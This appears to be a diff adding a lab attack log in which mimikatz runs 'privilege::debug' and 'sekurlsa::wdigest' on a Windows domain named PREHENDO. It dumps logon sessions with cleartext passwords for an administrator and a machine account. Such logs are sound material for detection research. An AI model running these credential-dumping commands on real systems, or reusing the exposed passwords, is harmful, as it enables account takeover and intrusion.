@@ -1,0 +1,309 @@
+Using 'C:\prehendo\Logs\attack1.log' for logfile : OK
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::wdigest
+
+Authentication Id : 0 ; 588258 (00000000:0008f9e2)
+Session           : RemoteInteractive from 2
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 8:13:58 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	wdigest :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * Password : 34099hfnEW(fk2
+
+Authentication Id : 0 ; 555556 (00000000:00087a24)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:13:56 PM
+SID               : S-1-5-90-0-2
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 555526 (00000000:00087a06)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:13:56 PM
+SID               : S-1-5-90-0-2
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 554673 (00000000:000876b1)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:13:56 PM
+SID               : S-1-5-96-0-2
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:26 PM
+SID               : S-1-5-19
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+
+Authentication Id : 0 ; 46260 (00000000:0000b4b4)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:25 PM
+SID               : S-1-5-90-0-1
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : (null)
+
+Authentication Id : 0 ; 46216 (00000000:0000b488)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:25 PM
+SID               : S-1-5-90-0-1
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : (null)
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:20 PM
+SID               : S-1-5-20
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : (null)
+
+Authentication Id : 0 ; 25065 (00000000:000061e9)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:20 PM
+SID               : S-1-5-96-0-1
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : (null)
+
+Authentication Id : 0 ; 25057 (00000000:000061e1)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:20 PM
+SID               : S-1-5-96-0-0
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : (null)
+
+Authentication Id : 0 ; 23867 (00000000:00005d3b)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:19 PM
+SID               : 
+	wdigest :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 8:00:19 PM
+SID               : S-1-5-18
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : (null)
+
+mimikatz(commandline) # exit
+Bye!
+Using 'C:\prehendo\Logs\attack1.log' for logfile : OK
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::wdigest
+
+Authentication Id : 0 ; 900475 (00000000:000dbd7b)
+Session           : RemoteInteractive from 3
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:31:12 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	wdigest :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * Password : 34099hfnEW(fk2
+
+Authentication Id : 0 ; 891159 (00000000:000d9917)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 891099 (00000000:000d98db)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 890371 (00000000:000d9603)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-96-0-3
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 313139 (00000000:0004c733)
+Session           : RemoteInteractive from 2
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:28:25 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	wdigest :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-19
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+
+Authentication Id : 0 ; 47129 (00000000:0000b819)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 47068 (00000000:0000b7dc)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-20
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 25733 (00000000:00006485)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-1
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 25592 (00000000:000063f8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-0
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+Authentication Id : 0 ; 22487 (00000000:000057d7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : 
+	wdigest :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-18
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+
+mimikatz(commandline) # exit
+Bye!
